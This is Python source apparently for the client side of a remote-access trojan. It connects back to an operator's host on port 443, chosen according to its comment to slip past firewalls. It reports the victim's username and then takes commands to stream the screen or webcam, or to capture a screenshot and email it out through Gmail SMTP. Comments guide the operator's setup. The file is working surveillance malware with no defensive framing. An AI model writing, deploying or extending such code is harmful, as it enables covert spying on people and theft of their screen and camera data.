from PIL import ImageGrab
from vidstream import *
import socket
import getpass
import smtplib
import base64
import os
import platform
clientHOST = "<Host IP Address(Yours, Most Likely)"
clientPORT = 443 # You can either change or leave the client port like it is, recommened port: 443, why? Firewalls don't block 443 (HTTPS).
BUFFER_SIZE = 1024
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((clientHOST, clientPORT))
s.send(str(getpass.getuser()).encode("utf-8"))
while True:
    Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
    if Handler_DATA == "screenshare":
        screen = ScreenShareClient(clientHOST, 4833)
        screen.start_stream()
    elif Handler_DATA == "webcam_stream":
        webcam = CameraClient(clientHOST, 4833)
        webcam.start_stream()
    elif Handler_DATA == "screenshot":
        screenshot = ImageGrab.grab()
        file = "screenshot.jpg"
        screenshot.save(file)
        f = open('screenshot.jpg', 'rb')
        data=f.read()
        data=base64.b64encode(data)
        f.close()
        os.remove(file)
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.starttls()
        smtp.login("YOUREMAIL@gmail.com", "YOUR GMAIL PASSWORD") # Only Gmail accounts will work, don't try something else like ProtonMail, make sure you open a new Gmail account and allow less secure apps
        message = data
        smtp.sendmail("SENDER_EMAIL@gmail.com", "YOUREMAIL@gmail.com", message) # Sender email doesn't really matter here, you can just type something that you'll remember, or you can be a normal guy and just type your email address instead :)
        smtp.quit()
    #elif Handler_DATA == "ipconfig": # NEEDS TO BE FINISHED UNIL 8/7/2021
        #if platform.system() == "Windows": # NEEDS TO BE FINISHED UNIL 8/7/2021
        ## pass
            
